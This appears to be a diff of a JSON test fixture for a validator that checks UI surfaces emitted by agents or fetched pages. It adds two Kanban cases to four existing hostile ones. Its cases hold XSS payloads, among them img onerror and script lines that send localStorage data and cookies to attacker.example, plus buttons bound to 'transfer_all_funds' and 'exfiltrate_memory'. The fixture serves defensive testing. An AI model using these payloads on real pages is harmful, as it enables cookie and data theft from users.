@@ -1,5 +1,5 @@
 {
-  "description": "Four surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
+  "description": "Six surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
   "cases": [
     {
       "name": "raw-html-type",
@@ -7,11 +7,31 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "RawHtml", "html": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "RawHtml",
+            "html": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
       },
       "expect_invariant": "catalog"
     },
@@ -21,11 +41,35 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "Button", "label": "Export", "onPress": {"action": "rerun"}, "onclick": "steal()"}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Button",
+            "label": "Export",
+            "onPress": {
+              "action": "rerun"
+            },
+            "onclick": "steal()"
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
       },
       "expect_invariant": "data-not-code"
     },
@@ -35,11 +79,31 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "Text", "text": "<script>document.location='https://attacker.example/'+document.cookie</script>"}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Text",
+            "text": "<script>document.location='https://attacker.example/'+document.cookie</script>"
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
       },
       "expect_invariant": "data-not-code"
     },
@@ -49,11 +113,136 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "Button", "label": "Wire funds", "onPress": {"action": "transfer_all_funds"}}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Button",
+            "label": "Wire funds",
+            "onPress": {
+              "action": "transfer_all_funds"
+            }
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
+      },
+      "expect_invariant": "event"
+    },
+    {
+      "name": "kanban-inline-cards",
+      "note": "A board whose cards are written INLINE instead of bound, carrying markup in a card. Structure and data travel apart precisely so this cannot happen.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Kanban",
+            "title": "Pipeline",
+            "groups": [
+              {
+                "name": "Applied",
+                "cards": [
+                  "<img src=x onerror=alert(1)>"
+                ]
+              }
+            ],
+            "titleKey": "name",
+            "cardsKey": "cards"
+          }
+        ],
+        "dataModel": {
+          "title": "Pipeline",
+          "board_columns": [
+            {
+              "name": "Applied",
+              "cards": [
+                "Acme"
+              ]
+            }
+          ]
+        }
+      },
+      "expect_invariant": "data-not-code"
+    },
+    {
+      "name": "kanban-unregistered-card-tap",
+      "note": "A board whose card tap names an action the catalog never registered, hoping a tap becomes a tool call.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Kanban",
+            "title": "Pipeline",
+            "groups": {
+              "$bind": "/board_columns"
+            },
+            "titleKey": "name",
+            "cardsKey": "cards",
+            "onCardPress": {
+              "action": "exfiltrate_memory"
+            }
+          }
+        ],
+        "dataModel": {
+          "title": "Pipeline",
+          "board_columns": [
+            {
+              "name": "Applied",
+              "cards": [
+                "Acme"
+              ]
+            }
+          ]
+        }
       },
       "expect_invariant": "event"
     }
